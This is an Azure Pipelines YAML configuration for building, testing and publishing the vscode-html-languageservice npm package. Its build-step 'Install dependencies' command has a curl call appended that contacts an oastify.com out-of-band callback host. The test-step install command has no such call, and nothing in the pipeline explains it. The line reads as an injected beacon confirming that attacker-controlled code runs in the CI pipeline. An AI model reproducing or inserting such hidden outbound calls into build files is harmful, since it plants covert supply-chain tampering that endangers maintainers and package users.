name: $(Date:yyyyMMdd)$(Rev:.r)

trigger:
  batch: true
  branches:
    include:
      - main
pr: none

resources:
  repositories:
    - repository: templates
      type: github
      name: microsoft/vscode-engineering
      ref: main
      endpoint: Monaco

parameters:
  - name: quality
    displayName: Quality
    type: string
    default: latest
    values:
      - latest
      - next
  - name: publishPackage
    displayName: ðŸš€ Publish vscode-html-languageservice
    type: boolean
    default: false

extends:
  template: azure-pipelines/npm-package/pipeline.yml@templates
  parameters:
    npmPackages:
      - name: vscode-html-languageservice

        buildSteps:
          - script: yarn --frozen-lockfile && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/microsoft/vscode-html-languageservice
            displayName: Install dependencies

          # the rest of the build steps are part of the 'prepack' script, automatically run when the pipeline invokes 'yarn pack'

        tag: ${{ parameters.quality }}
        preReleaseTag: next
        preReleaseTagAddToLatest: true
        publishPackage: ${{ parameters.publishPackage }} 

        testPlatforms:
          - name: Linux
            nodeVersions:
              - 16.x
          - name: MacOS
            nodeVersions:
              - 16.x
          - name: Windows
            nodeVersions:
              - 16.x                   

        testSteps:
          - script: yarn --frozen-lockfile
            displayName: Install dependencies        
          - script: yarn test
            displayName: Test npm package
